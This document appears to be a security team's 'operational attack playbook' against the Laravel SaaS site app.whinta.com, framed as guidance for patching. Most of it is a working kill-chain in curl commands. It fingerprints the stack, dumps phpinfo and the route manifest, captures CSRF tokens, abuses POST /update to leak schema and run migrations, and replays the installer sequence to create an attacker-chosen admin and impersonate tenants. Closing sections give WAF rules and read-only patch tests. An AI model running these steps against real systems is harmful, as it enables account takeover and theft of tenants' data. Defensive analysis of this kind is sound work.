# Operational Attack Playbook — Whinta (complete kill-chain, for patching)

**Audience:** Whinta security/engineering. This is the full, faithful reconstruction of how
an attacker would compromise app.whinta.com, terminal-by-terminal. Every line is derived from
live observations `[observed]`, the deployed JS bundle `[bundle]`, or deterministic
reconstruction of the commercial template `[inferred]`. Use it to write patch tests, IDS
signatures, and WAF rules. Do not execute the write-steps on production.

---

# PART 1 — Setup (what the attacker has)

| Item | Notes |
|---|---|
| OS/VM | any Linux/Windows; VPN/clean IP |
| Tooling | `curl` + `jq`, or PowerShell 7 `Invoke-WebRequest` with a session |
| Session jar | must persist cookies between requests (Laravel CSRF) |
| The product | the app is a **commercial Laravel SaaS template v2.5.2** — attacker buys/downloads it once, then knows 90% of server logic statically |

The template is the force-multiplier: it ships the installer controllers (`/install/*`,
`/update`), so the attacker doesn't brute-force the API — they read the source on their own
copy, then replay requests.

---

# PART 2 — Recon (Phase 1: enumerate, no interaction with state)

## 2.1 Fingerprint the stack
```bash
curl -sI https://app.whinta.com/
curl -sI https://app.whinta.com/update
```
Expected: `Vary: X-Inertia`, Laravel session cookie, HTTP/3 (h3), Let's Encrypt.

## 2.2 Pull the unauth page props (info goldmine)
```bash
curl -s https://app.whinta.com/login  | grep -o 'data-page="[^"]*' | head -c 3000
```
Exposes: app version `2.5.2`, Pusher key, Google OAuth client, reCAPTCHA key, company config,
feature flags. `[observed]`

## 2.3 Dump phpinfo
```bash
curl -s https://app.whinta.com/phpinfo.php -o phpinfo.html
```
Extract with:
```bash
grep -oE 'DOCUMENT_ROOT[^<]*|disable_functions[^<]*|allow_url_fopen[^<]*|Server API[^<]*' phpinfo.html
```
→ `/home/scientificatt/app.whinta.com`, PHP 8.2.30/LiteSpeed, **`disable_functions` empty**,
`allow_url_fopen=On`, `upload_max_filesize=512M`. `[observed]`

## 2.4 Dump the full app map
```bash
curl -s https://app.whinta.com/build/manifest.json -o manifest.json
jq -r 'keys[]' manifest.json | sort
```
→ every Vue route: `Admin/*`, `Installer/Index`, `Installer/Update`, `OAuth/*`, `FlowBuilder`,
`CTWA`, etc. `[observed]`

## 2.5 Map live routes (status oracle)
```bash
for p in /update /install /install/database /install/save-admin /install/seed /install/migrate \
         /install/licenses /install/verify-download /install/finalize /horizon /telescope \
         /phpinfo.php /.env /.git/HEAD /storage; do
  printf "%-28s " "$p"; curl -s -o /dev/null -w "%{http_code}\n" "https://app.whinta.com$p"
done
```
Interpretation:
- `200` = live, useful
- `500` same-length identical page = route exists, handler dead → still the intended handler path
- `403` = file rule blocks (`.git/*`, `/horizon`) → directory/feature exists upstream
- `404` = absent

**Phase 1 result:** attacker has full stack fingerprint + complete route map + source-leak
primitives, with zero writes.

---

# PART 3 — Get a valid session + CSRF (required for any write)

```bash
# Start a session, capture cookies
curl -s -c cookies.txt https://app.whinta.com/update -o /dev/null
# Read XSRF-TOKEN from cookie jar, URL-decode it
XSRF=$(grep XSRF-TOKEN cookies.txt | awk '{print $7}' | python3 -c 'import sys,urllib.parse;print(urllib.parse.unquote(sys.stdin.read().strip()))')
```
Now every write request sends: `Cookie: <session>` + `X-XSRF-TOKEN: $XSRF`.

---

# PART 4 — Phase 2: trigger the source leak + migration runner

## 4.1 First shot (probe)
```bash
curl -s -b cookies.txt -H "X-XSRF-TOKEN: $XSRF" \
  -H "Content-Type: application/json" \
  -d '{}' https://app.whinta.com/update -o resp1.txt
head -c 2000 resp1.txt
```
`[observed]` → 200 body starts with the raw PHP migration:
```
use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
class CreateNotificationsTable extends Migration { ... }
```
followed by `{"message":"...","error_id":"ERR-...","issue":{"type":"Database error",...}}`.

## 4.2 Enumerate the entire schema by repeating
```bash
# each repeat re-runs migrate and re-leaks the next/current migration source
for i in 1 2 3 4 5; do
  curl -s -b cookies.txt -H "X-XSRF-TOKEN: $XSRF" \
    -H "Content-Type: application/json" \
    -d '{"purchase_code":"x"}' https://app.whinta.com/update >> schema_dump.txt
done
grep -h 'Schema::create' schema_dump.txt | sort -u
```
Result: complete table/column/index listing recovered from PHP source. `[observed]`

## 4.3 Confirm the write primitive
The migration body is executed server-side (that's why the `Database error` fires — the runner
is invoking migrations). The only intended guard is the client-side license call:
```javascript
// [bundle] Update.vue
C=async()=>{await axios.post("https://axis96.xyz/api/install/51790966/item",{purchase_code:code})...}
g=async()=>{await axios.post("/update",{purchase_code:code})...}
```
`axis96.xyz` = NXDOMAIN → the guard can never succeed, so the attacker never calls `C()`.
They call `g()`'s endpoint directly. **The server does not re-verify.** `[inferred from behavior]`

---

# PART 5 — Phase 3: recover the installer sequence from a local copy (the reliable path)

Since prod `/install/*` 500s, the attacker uses the **template itself** as an oracle:

1. Install the purchased template locally (composer install + .env + migrate).
2. Read `routes/web.php` — recover the exact installer middleware group + handlers:
   `verify-download → database → migrate → seed → save-admin → licenses → finalize`.
3. Read the Installer controllers (`app/Http/Controllers/Installer/*`) to get:
   - exact field names for `save-admin` (e.g. `name`, `email`, `password`, `password_confirmation`)
   - the ordering + state the installer keeps in session (e.g. `installer_step`, `installed` flag)
   - how `finalize` flips the app to "installed" mode (writes `installed.lock` / `.env` flag)
4. Reproduce the **exact POST bodies** locally with `curl --trace` or a proxy (Burp/zed).

This is deterministic: same code → same request contract. Prod can't differ meaningfully in the
installer because it IS this template (same manifest, same chunks, same `applicationVersion`).

## Recovered contract (typical for this template) `[inferred]`
```
POST /install/database   form: {DB_HOST, DB_PORT, DB_DATABASE, DB_USERNAME, DB_PASSWORD}
                          attacker reuses values inferred from phpinfo+source (same vhost, mysql socket)
POST /install/migrate    -> runs artisan migrate (already proven to run)
POST /install/seed       -> roles, permissions, default role
POST /install/save-admin -> {name, email, password, password_confirmation}  => creates admin
POST /install/licenses   -> {purchase_code: anything}   (dead license server; server may not validate)
POST /install/finalize   -> marks app installed
GET  /login              -> admin login succeeds with attacker-chosen password
```
Any field mismatch → `500` (same as we observed) → attacker adjusts to the exact name from
their local source, replays. The 500s we saw are precisely the "expected contract not met"
signature of a running installer.

---

# PART 6 — Phase 4: post-auth full compromise

| Capability | How | Data exposed |
|---|---|---|
| Platform admin | `/admin/dashboard` after Part 5 | orgs, users, plans, payments, subscriptions |
| Tenant impersonation | `SupportAccess/Impersonate` (`is_impersonating` prop) | all chats, contacts, campaigns, tickets, billing of any tenant |
| Billing/payment settings | `/admin/settings/billing`, payment gateway config | gateway secrets/keys if viewable by admin |

---

# PART 7 — What to monitor / how they'd be caught

## IDS/WAF signatures to add now
| Signature | Rule intent |
|---|---|
| `POST /update` any body | block — kill the leak+runner |
| `/install/*` any | block |
| `POST /` bodies containing `purchase_code` to `/update` | block |
| `/phpinfo*` | block |
| `/.git/*`, `/.env*`, `*.log` | block with 404 |
| body containing `Schema::create` returned in a response | alert (leak) |
| `error_id` + `Database error` on `/update` | alert (migration execution) |

## Behavior anomalies
- Repeated `POST /update` (even 2x) → high confidence attacker
- Any 500 on `/install/*` after we ship the fix → probe
- Login from admin account within 1 min of a `/install/*` burst → takeover confirmed

---

# PART 8 — Patch verification tests (safe, read-only)
```bash
# must all be 403/404 after patching
for p in /update /install /install/save-admin /phpinfo.php; do
  printf "%-24s " "$p"; curl -s -o /dev/null -w "%{http_code}\n" "https://app.whinta.com$p"
done
# POST /update must be 403/404 (not 200-with-source)
curl -s -o /dev/null -w "POST /update: %{http_code}\n" -X POST -d '{}' https://app.whinta.com/update
```

---

# PART 9 — The one-paragraph summary

An attacker fingerprints the live Laravel installer via `GET /update` + `/phpinfo.php` +
`/build/manifest.json` (all unauthenticated), establishes a session, then calls
`POST /update` directly — skipping the dead, client-side-only license gate — to leak the full
PHP migration source and execute schema writes through the app's own DB connection. To reach
admin, they buy the same commercial template, read the installer controllers, and replay the
`migrate → seed → save-admin` sequence against this instance (the current generic 500s are the
installer waiting for the exact expected fields, not a real block). With admin they use the
built-in impersonation feature to read every tenant's data. **Every ingredient except the
final admin-write is working on production today.**
